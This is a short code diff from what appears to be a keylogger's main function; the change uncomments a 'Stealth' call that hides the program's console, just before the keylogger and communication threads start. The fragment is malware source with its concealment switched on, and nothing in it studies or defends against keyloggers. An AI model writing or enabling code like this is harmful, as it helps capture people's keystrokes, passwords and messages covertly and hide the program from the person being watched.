@@ -7,7 +7,7 @@ int	main(void) {
 
 	try {
 		//// Hide program console
-		//kLogger.Stealth();
+		kLogger.Stealth();
 		// Launch keylogger and com threads
 		thread.InitThreads(kLogger, com);
 		// Close all thread handles and free memory allocations.
